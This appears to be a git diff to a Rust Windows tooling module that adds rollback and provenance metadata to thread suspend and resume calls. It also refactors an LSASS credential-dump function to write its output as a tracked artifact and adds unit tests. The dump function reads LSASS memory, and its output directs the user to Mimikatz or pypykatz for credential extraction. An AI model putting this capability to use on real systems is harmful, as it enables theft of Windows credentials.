@@ -2,7 +2,122 @@
 
 use crate::error::MemoricError;
 use crate::safe_handle::SafeHandle;
+use serde_json::json;
 use serde_json::Value;
+
+fn provenance_json(args: &Value) -> Value {
+    json!({
+        "correlation_id": crate::observability::correlation_id_from_args(args),
+        "request_id": args.get("request_id").cloned().unwrap_or(Value::Null),
+        "task_id": args.get("task_id").cloned().unwrap_or(Value::Null),
+        "chain_id": args.get("chain_id").cloned().unwrap_or(Value::Null),
+        "purpose": args.get("purpose").cloned().unwrap_or(Value::Null),
+    })
+}
+
+fn thread_suspend_rollback(tid: u64, previous_suspend_count: u32) -> Value {
+    let args = json!({
+        "tid": tid,
+    });
+    json!({
+        "available": true,
+        "strategy": "resume_thread",
+        "captured_fields": ["tid", "previous_suspend_count"],
+        "previous_suspend_count": previous_suspend_count,
+        "args": args.clone(),
+        "action": {
+            "tool": "target",
+            "action": "thread_resume",
+            "args": args,
+        },
+        "detail": "thread suspend can usually be undone with a matching ResumeThread call when the live handler captured the previous suspend count",
+    })
+}
+
+fn thread_resume_rollback(tid: u64, previous_suspend_count: u32) -> Value {
+    let suspend_calls_needed = if previous_suspend_count == 0 { 0 } else { 1 };
+    let available = if suspend_calls_needed > 0 {
+        json!("partial")
+    } else {
+        json!(false)
+    };
+    let action = if suspend_calls_needed > 0 {
+        json!({
+            "tool": "target",
+            "action": "thread_suspend",
+            "args": {
+                "tid": tid
+            }
+        })
+    } else {
+        Value::Null
+    };
+
+    json!({
+        "available": available,
+        "strategy": "restore_suspend_count",
+        "captured_fields": ["tid", "previous_suspend_count", "suspend_calls_needed"],
+        "previous_suspend_count": previous_suspend_count,
+        "suspend_calls_needed": suspend_calls_needed,
+        "action": action,
+        "detail": "thread resume rollback is partial because ResumeThread mutates a counter and restoring it may require re-suspending the thread",
+    })
+}
+
+#[cfg(test)]
+mod thread_rollback_tests {
+    use super::*;
+    use serde_json::json;
+
+    #[test]
+    fn thread_suspend_rollback_emits_executable_resume_action() {
+        let rollback = thread_suspend_rollback(1234, 0);
+
+        assert_eq!(rollback["available"], true);
+        assert_eq!(rollback["strategy"], "resume_thread");
+        assert_eq!(rollback["previous_suspend_count"], 0);
+        assert_eq!(rollback["action"]["tool"], "target");
+        assert_eq!(rollback["action"]["action"], "thread_resume");
+        assert_eq!(rollback["action"]["args"]["tid"], 1234);
+    }
+
+    #[test]
+    fn thread_resume_rollback_reports_partial_suspend_restore() {
+        let rollback = thread_resume_rollback(1234, 2);
+
+        assert_eq!(rollback["available"], "partial");
+        assert_eq!(rollback["strategy"], "restore_suspend_count");
+        assert_eq!(rollback["previous_suspend_count"], 2);
+        assert_eq!(rollback["suspend_calls_needed"], 1);
+        assert_eq!(rollback["action"]["tool"], "target");
+        assert_eq!(rollback["action"]["action"], "thread_suspend");
+    }
+
+    #[test]
+    fn thread_resume_rollback_marks_noop_resume_irreversible() {
+        let rollback = thread_resume_rollback(1234, 0);
+
+        assert_eq!(rollback["available"], false);
+        assert_eq!(rollback["suspend_calls_needed"], 0);
+        assert!(rollback["action"].is_null());
+    }
+
+    #[test]
+    fn provenance_json_carries_request_task_chain_and_purpose() {
+        let provenance = provenance_json(&json!({
+            "request_id": "req-1",
+            "task_id": "task-1",
+            "chain_id": "chain-1",
+            "purpose": "test provenance"
+        }));
+
+        assert_eq!(provenance["correlation_id"], "req-1");
+        assert_eq!(provenance["request_id"], "req-1");
+        assert_eq!(provenance["task_id"], "task-1");
+        assert_eq!(provenance["chain_id"], "chain-1");
+        assert_eq!(provenance["purpose"], "test provenance");
+    }
+}
 
 /// List threads in a process
 pub fn list_threads(args: &Value) -> Result<Value, MemoricError> {
@@ -190,7 +305,10 @@ pub fn suspend_thread(args: &Value) -> Result<Value, MemoricError> {
 
         Ok(serde_json::json!({
             "success": true,
-            "previous_suspend_count": prev_count
+            "tid": tid,
+            "previous_suspend_count": prev_count,
+            "rollback": thread_suspend_rollback(tid, prev_count),
+            "provenance": provenance_json(args)
         }))
     }
 }
@@ -219,15 +337,16 @@ pub fn resume_thread(args: &Value) -> Result<Value, MemoricError> {
 
         Ok(serde_json::json!({
             "success": true,
-            "previous_suspend_count": prev_count
+            "tid": tid,
+            "previous_suspend_count": prev_count,
+            "rollback": thread_resume_rollback(tid, prev_count),
+            "provenance": provenance_json(args)
         }))
     }
 }
 
 /// Dump credentials from LSASS
 pub fn dump_credentials(args: &Value) -> Result<Value, MemoricError> {
-    use std::fs::File;
-    use std::io::Write;
     use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;
     use windows::Win32::System::Diagnostics::ToolHelp::{
         CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
@@ -364,25 +483,110 @@ pub fn dump_credentials(args: &Value) -> Result<Value, MemoricError> {
             addr = (mbi.BaseAddress as usize) + mbi.RegionSize;
         }
 
-        if let Some(path) = output_path {
-            let mut file = File::create(path)
-                .map_err(|e| MemoricError::WindowsApi(format!("Failed to create file: {}", e)))?;
-
-            file.write_all(&dump_data)
-                .map_err(|e| MemoricError::WindowsApi(format!("Failed to write file: {}", e)))?;
-
+        let artifact = if let Some(path) = output_path {
+            let artifact = write_credential_dump_artifact(args, path, &dump_data)?;
             tracing::info!("LSASS dump written to {}", path);
-        }
+            Some(artifact)
+        } else {
+            None
+        };
 
-        Ok(serde_json::json!({
-            "success": true,
-            "lsass_pid": pid,
-            "output_path": output_path.unwrap_or("memory only"),
-            "dump_size": dump_data.len(),
-            "regions_read": regions_read,
-            "message": "LSASS memory dumped. Use Mimikatz or pypykatz to extract credentials.",
-            "note": "For full credential extraction, analyze with: pypykatz lsa minidump <file>"
-        }))
+        Ok(credential_dump_response(
+            pid,
+            output_path,
+            artifact,
+            dump_data.len(),
+            regions_read,
+        ))
+    }
+}
+
+fn write_credential_dump_artifact(
+    args: &Value,
+    path: &str,
+    dump_data: &[u8],
+) -> Result<Value, MemoricError> {
+    let correlation_id = crate::observability::correlation_id_from_args(args);
+    crate::artifact::write_artifact_bytes(
+        path,
+        dump_data,
+        crate::artifact::retention_secs_from_args(args),
+        correlation_id.as_deref(),
+    )
+    .map_err(|e| MemoricError::WindowsApi(format!("Failed to write artifact: {}", e)))
+}
+
+fn credential_dump_response(
+    pid: u32,
+    output_path: Option<&str>,
+    artifact: Option<Value>,
+    dump_size: usize,
+    regions_read: u32,
+) -> Value {
+    let mut result = serde_json::json!({
+        "success": true,
+        "lsass_pid": pid,
+        "output_path": output_path.unwrap_or("memory only"),
+        "dump_size": dump_size,
+        "regions_read": regions_read,
+        "redaction_status": if artifact.is_some() { "artifact" } else { "metadata_only" },
+        "message": "LSASS memory dumped. Use Mimikatz or pypykatz to extract credentials.",
+        "note": "For full credential extraction, analyze with: pypykatz lsa minidump <file>"
+    });
+    if let Some(artifact) = artifact {
+        if let Some(obj) = result.as_object_mut() {
+            obj.insert("artifact".to_string(), artifact);
+        }
+    }
+    result
+}
+
+#[cfg(test)]
+mod tests {
+    use super::{credential_dump_response, write_credential_dump_artifact};
+    use serde_json::json;
+
+    #[test]
+    fn credential_dump_artifact_registers_hash_metadata() {
+        let output_path = std::env::temp_dir().join(format!(
+            "memoric-cred-dump-artifact-{}.bin",
+            std::process::id()
+        ));
+        let _ = std::fs::remove_file(&output_path);
+
+        let artifact = write_credential_dump_artifact(
+            &json!({"artifact_retention_secs": 60, "request_id": "cred-artifact-test"}),
+            output_path.to_str().unwrap(),
+            b"credential dump bytes",
+        )
+        .expect("write artifact");
+        let result = credential_dump_response(
+            500,
+            Some(output_path.to_str().unwrap()),
+            Some(artifact.clone()),
+            21,
+            2,
+        );
+
+        assert_eq!(result["success"], true);
+        assert_eq!(result["redaction_status"], "artifact");
+        assert_eq!(result["artifact"]["size_bytes"], 21);
+        assert!(result["artifact"]["sha256"].as_str().is_some());
+        let uri = result["artifact"]["uri"].as_str().expect("artifact uri");
+        assert!(crate::artifact::is_artifact_uri(uri));
+
+        let _ = crate::artifact::forget(uri);
+        let _ = std::fs::remove_file(output_path);
+    }
+
+    #[test]
+    fn credential_dump_without_output_path_returns_metadata_only() {
+        let result = credential_dump_response(500, None, None, 0, 0);
+
+        assert_eq!(result["success"], true);
+        assert_eq!(result["output_path"], "memory only");
+        assert_eq!(result["redaction_status"], "metadata_only");
+        assert!(result.get("artifact").is_none());
     }
 }
 
